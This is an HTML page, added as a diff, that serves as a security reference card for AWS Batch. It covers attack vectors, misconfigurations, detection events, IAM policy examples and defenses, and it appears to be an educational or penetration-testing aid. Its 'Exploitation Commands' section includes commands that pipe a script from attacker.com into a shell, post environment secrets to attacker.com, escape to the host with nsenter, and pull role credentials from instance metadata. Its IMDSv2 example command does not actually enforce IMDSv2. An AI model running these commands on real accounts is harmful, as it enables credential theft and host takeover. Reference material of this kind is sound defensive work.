@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS Batch Security | AWS Security Cards</title>
+<meta name="description" content="AWS Batch enables batch computing workloads on AWS. It dynamically provisions compute resources and runs containerized jobs. Attackers target job definitions, compute environments, and container escape vectors.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #eab30815, #0a0e1a, #f59e0b15);
+    border: 1px solid #eab3084d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #eab3080d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #eab30833;
+    color: #eab308;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #eab3084d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #fb923c; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/batch-card.webp" alt="AWS Batch Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/batch.svg" alt="AWS Batch Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS Batch Security</span>
+        <span class="header-badge">COMPUTE</span>
+      </div>
+      <p class="header-desc">AWS Batch enables batch computing workloads on AWS. It dynamically provisions compute resources and runs containerized jobs. Attackers target job definitions, compute environments, and container escape vectors.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">HIGH</div>
+          <div class="stat-label">Risk Level</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">EC2/Fargate</div>
+          <div class="stat-label">Compute Types</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">Container</div>
+          <div class="stat-label">Job Execution</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">IAM Role</div>
+          <div class="stat-label">Per Job</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#eab308;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #eab308;">Compute Environments</h4>
+          <p>Managed or unmanaged compute environments using EC2 or Fargate. Managed environments auto-scale instances based on job queue demand. Unmanaged environments use your own EC2 instances.</p>
+          <div class="attack-note"><span style="color:#eab308;">Attack note:</span> Compute environment IAM roles often have excessive permissions for instance management</div>
+        </div>
+        <div>
+          <h4 style="color: #eab308;">Job Definitions &amp; Queues</h4>
+          <p>Job definitions specify container images, commands, IAM roles, and resource requirements. Job queues route jobs to compute environments with scheduling priority.</p>
+          <div class="attack-note"><span style="color:#eab308;">Attack note:</span> Job definitions can be modified to inject malicious containers or steal credentials</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 75%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">7.5</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">AWS Batch presents significant risk due to container execution with IAM roles, potential for container escape, and job definition manipulation. Compromised jobs can access instance metadata and steal credentials.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Job Definition Manipulation</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Register malicious job definitions</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Modify container image to backdoored version</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Inject commands via containerOverrides</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Add environment variables to exfiltrate secrets</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Mount sensitive host paths into container</li></ul><h4 style="color: #f87171;">Credential Theft</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Access IMDS from running containers</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Steal job execution role credentials</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Extract ECS task credentials endpoint</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Harvest secrets from environment variables</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Access shared storage with sensitive data</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Job Definition Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Privileged containers enabled</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Host network mode allowing IMDS access</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Overly permissive job execution roles</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Secrets in environment variables</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Writable host volume mounts</li></ul><h4 style="color: #fb923c;">Compute Environment Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Instance role with admin permissions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Public subnets for compute instances</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No encryption for EBS volumes</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> SSH keys on managed instances</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Security groups too permissive</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List Compute Environments</div>
+          <pre><code>aws batch describe-compute-environments</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Job Queues</div>
+          <pre><code>aws batch describe-job-queues</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Job Definitions</div>
+          <pre><code>aws batch describe-job-definitions --status ACTIVE</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Running Jobs</div>
+          <pre><code>aws batch list-jobs \\
+  --job-queue my-queue \\
+  --job-status RUNNING</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Describe Specific Job</div>
+          <pre><code>aws batch describe-jobs --jobs job-id-123</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">🚀 Container Escape</h3><h4 style="color: #c084fc;">Escape Techniques</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Privileged container kernel exploits</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Docker socket mount exploitation</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Host PID namespace attacks</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Capabilities abuse (CAP_SYS_ADMIN)</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> cgroups escape via release_agent</li></ul><h4 style="color: #c084fc;">Post-Escape Actions</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Access host instance metadata</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Pivot to other containers on host</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Modify instance configuration</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Install persistence mechanisms</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Access EBS volumes directly</li></ul><div class="note"><strong>Critical:</strong> Privileged containers or host mounts enable full host compromise and credential theft.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">💉 Job Injection</h3><h4 style="color: #facc15;">Attack Scenarios</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Submit jobs with malicious commands</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Override container commands at runtime</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Inject reverse shell payloads</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Exfiltrate data via job output</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Chain jobs for persistent access</li></ul><h4 style="color: #facc15;">Impact</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Code execution in target environment</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Access to job execution role permissions</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Data exfiltration via network/storage</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Resource hijacking (cryptomining)</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Lateral movement to connected services</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> RegisterJobDefinition - new definition created</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> SubmitJob - job submitted</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateComputeEnvironment - env modified</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateComputeEnvironment - new env created</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DeregisterJobDefinition - definition removed</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Unknown container images in job defs</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Jobs with privileged mode enabled</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Unusual job submission patterns</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Jobs accessing sensitive S3 paths</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Container override commands injected</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Register Malicious Job Definition</div>
+          <pre><code>aws batch register-job-definition \\
+  --job-definition-name backdoor-job \\
+  --type container \\
+  --container-properties '{
+    &quot;image&quot;: &quot;attacker/malicious:latest&quot;,
+    &quot;vcpus&quot;: 1,
+    &quot;memory&quot;: 512,
+    &quot;command&quot;: [&quot;sh&quot;, &quot;-c&quot;, &quot;curl http://attacker.com/shell.sh | sh&quot;],
+    &quot;jobRoleArn&quot;: &quot;arn:aws:iam::123456789012:role/BatchJobRole&quot;
+  }'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Submit Job with Command Override</div>
+          <pre><code>aws batch submit-job \\
+  --job-name exfil-job \\
+  --job-queue production-queue \\
+  --job-definition legit-job-def \\
+  --container-overrides '{
+    &quot;command&quot;: [&quot;sh&quot;, &quot;-c&quot;, &quot;env | curl -X POST -d @- http://attacker.com/collect&quot;]
+  }'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Submit Privileged Job</div>
+          <pre><code>aws batch register-job-definition \\
+  --job-definition-name priv-escape \\
+  --type container \\
+  --container-properties '{
+    &quot;image&quot;: &quot;alpine&quot;,
+    &quot;vcpus&quot;: 1,
+    &quot;memory&quot;: 512,
+    &quot;privileged&quot;: true,
+    &quot;command&quot;: [&quot;sh&quot;, &quot;-c&quot;, &quot;nsenter -t 1 -m -u -i -n sh&quot;]
+  }'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Access IMDS from Job Container</div>
+          <pre><code># Inside running Batch container
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Extract ECS Task Credentials</div>
+          <pre><code># Inside Fargate Batch container
+curl $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+# Returns temporary credentials for task role</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List and Describe All Job Definitions</div>
+          <pre><code>aws batch describe-job-definitions \\
+  --status ACTIVE \\
+  --query 'jobDefinitions[*].[jobDefinitionName,containerProperties.image,containerProperties.jobRoleArn]' \\
+  --output table</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Overpermissive Job Role</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;s3:*&quot;,
+      &quot;secretsmanager:GetSecretValue&quot;,
+      &quot;iam:PassRole&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Job role with wildcard permissions allows data theft and privilege escalation</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Least Privilege Job Role</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [&quot;s3:GetObject&quot;, &quot;s3:PutObject&quot;],
+    &quot;Resource&quot;: &quot;arn:aws:s3:::batch-data-bucket/jobs/*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Job role restricted to specific bucket path needed for processing</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Unrestricted Batch Submission</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;batch:SubmitJob&quot;,
+      &quot;batch:RegisterJobDefinition&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Allows submitting jobs to any queue with any definition - potential code execution</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Restricted Batch Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [&quot;batch:SubmitJob&quot;],
+    &quot;Resource&quot;: [
+      &quot;arn:aws:batch:us-east-1:123456789012:job-queue/approved-queue&quot;,
+      &quot;arn:aws:batch:us-east-1:123456789012:job-definition/approved-job:*&quot;
+    ]
+  }]
+}</code></pre>
+          <p class="policy-desc">Can only submit jobs to specific queue using approved job definition</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Disable Privileged Containers</h4>
+              <p>Never allow privileged mode in job definitions. Use SCP to deny.</p>
+              <pre><code># SCP to deny privileged containers
+{
+  &quot;Effect&quot;: &quot;Deny&quot;,
+  &quot;Action&quot;: &quot;batch:RegisterJobDefinition&quot;,
+  &quot;Resource&quot;: &quot;*&quot;,
+  &quot;Condition&quot;: {
+    &quot;Bool&quot;: {&quot;batch:Privileged&quot;: &quot;true&quot;}
+  }
+}</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🚫</span>
+            <div>
+              <h4>Require IMDSv2</h4>
+              <p>Configure compute environments to require IMDSv2, preventing simple credential theft.</p>
+              <pre><code>aws batch update-compute-environment \\
+  --compute-environment prod-env \\
+  --compute-resources 'ec2Configuration=[{imageIdOverride=ami-xxx}]'</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔒</span>
+            <div>
+              <h4>Use Fargate for Isolation</h4>
+              <p>Fargate provides better isolation than EC2 compute environments.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📝</span>
+            <div>
+              <h4>Restrict Job Definition Registration</h4>
+              <p>Limit who can register job definitions using IAM policies.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔑</span>
+            <div>
+              <h4>Use Secrets Manager</h4>
+              <p>Never put secrets in environment variables. Use AWS Secrets Manager with job role access.</p>
+              <pre><code># In job container
+aws secretsmanager get-secret-value \\
+  --secret-id prod/db-creds</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📊</span>
+            <div>
+              <h4>Monitor Job Submissions</h4>
+              <p>Alert on jobs with unusual images, commands, or from unexpected principals.</p>
+              
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS Batch Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
